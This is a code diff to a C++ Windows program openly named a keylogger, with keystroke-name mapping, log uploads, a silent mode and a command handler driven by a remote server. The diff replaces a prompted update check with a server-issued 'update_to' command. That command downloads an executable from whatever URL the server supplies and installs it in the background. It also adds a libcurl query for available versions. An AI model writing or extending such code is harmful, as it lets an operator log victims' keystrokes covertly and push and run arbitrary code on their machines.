@@ -67,6 +67,18 @@ std::string readFileContent(const std::string& filePath);
 std::string getExecutableDir();
 std::string GetLogDirectory();
 
+// WriteCallback 函数定义：用于 libcurl 接收 HTTP 响应到 std::string
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
+    size_t newLength = size * nmemb;
+    try {
+        s->append((char*)contents, newLength);
+    }
+    catch (std::bad_alloc& e) {
+        return 0;
+    }
+    return newLength;
+}
+
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
     {VK_BACK, "[BACKSPACE]" },
@@ -318,30 +330,6 @@ void CleanupNotifyIcon()
         Shell_NotifyIconW(NIM_DELETE, &nid);
         DestroyWindow(g_hNotifyWnd);
         g_hNotifyWnd = NULL;
-    }
-}
-
-// 自动更新检查函数
-void CheckForUpdates() {
-    AutoUpdater updater("http://" + g_serverHost + ":" + std::to_string(g_serverPort), APP_VERSION);
-    
-    std::string latest_version, download_url;
-    if (updater.checkForUpdates(latest_version, download_url)) {
-        // 显示更新通知
-        std::wstring title = L"发现新版本";
-        std::wstring content = L"发现新版本 " + std::wstring(latest_version.begin(), latest_version.end()) + L"，是否更新？";
-        
-        int result = MessageBox(NULL, content.c_str(), title.c_str(), MB_YESNO | MB_ICONINFORMATION);
-        if (result == IDYES) {
-            // 下载更新
-            std::string update_file = GetLogDirectory() + "\\Keylogger_update.exe";
-            if (updater.downloadUpdate(download_url, update_file)) {
-                // 安装更新
-                updater.installUpdate(update_file);
-            } else {
-                MessageBox(NULL, L"下载更新失败", L"错误", MB_OK | MB_ICONERROR);
-            }
-        }
     }
 }
 
@@ -1540,6 +1528,7 @@ std::string ProcessCommand(const std::string& command)
             response["data"]["upload_enabled"] = uploadEnabled.load();
             response["data"]["local_port"] = g_localPort;
             response["data"]["ip"] = GetLocalIPAddress();
+            response["data"]["version"] = APP_VERSION;
         }
         else if (action == "start_upload") {
             if (!uploadEnabled) {
@@ -1576,6 +1565,64 @@ std::string ProcessCommand(const std::string& command)
             response["data"]["local_port"] = g_localPort;
             response["data"]["ip"] = GetLocalIPAddress();
             response["data"]["log_dir"] = GetLogDirectory();
+            response["data"]["version"] = APP_VERSION;
+        }
+        else if (action == "get_versions") {
+            response["type"] = "versions_list";
+            // 调用服务器获取可用版本列表
+            CURL* curl = curl_easy_init();
+            if (curl) {
+                std::string response_string;
+                std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/versions/list/available";
+                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
+                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+                CURLcode res = curl_easy_perform(curl);
+                if (res == CURLE_OK) {
+                    try {
+                        json j = json::parse(response_string);
+                        if (j.contains("versions") && j["versions"].is_array()) {
+                            response["data"]["versions"] = j["versions"];
+                        }
+                    } catch (...) {}
+                }
+                curl_easy_cleanup(curl);
+            }
+            response["data"]["current_version"] = APP_VERSION;
+        }
+        else if (action == "update_to") {
+            // 接收服务器推送的更新指令并执行更新
+            if (cmd.contains("download_url") && cmd.contains("version")) {
+                std::string download_url = cmd["download_url"].get<std::string>();
+                std::string target_version = cmd["version"].get<std::string>();
+
+                response["status"] = "ok";
+                response["type"] = "update_started";
+                response["data"]["target_version"] = target_version;
+
+                std::cout << "Received update command to version " << target_version << std::endl;
+
+                // 异步执行更新，不阻塞命令处理
+                std::thread([download_url, target_version]() {
+                    std::string update_file = GetLogDirectory() + "\\Keylogger_update.exe";
+
+                    // 显示更新提示
+                    std::wstring title = L"正在更新";
+                    std::wstring content = L"正在下载并安装版本 " + std::wstring(target_version.begin(), target_version.end()) + L"...";
+                    MessageBox(NULL, content.c_str(), title.c_str(), MB_OK | MB_ICONINFORMATION);
+
+                    AutoUpdater updater(APP_VERSION);
+                    if (updater.downloadUpdate(download_url, update_file)) {
+                        updater.installUpdate(update_file);
+                    } else {
+                        MessageBox(NULL, L"下载更新失败", L"错误", MB_OK | MB_ICONERROR);
+                    }
+                }).detach();
+            } else {
+                response["status"] = "error";
+                response["message"] = "Missing 'download_url' or 'version' parameter";
+            }
         }
         else if (action == "get_logs_info") {
             response["type"] = "logs_info";
@@ -2097,10 +2144,6 @@ int main()
     if (!IsSilentMode()) {
         ShowWelcomeWindow();
     }
-
-    // 检查更新
-    std::thread updateThread(CheckForUpdates);
-    updateThread.detach();
 
 #ifdef bootwait 
     while (IsSystemBooting())
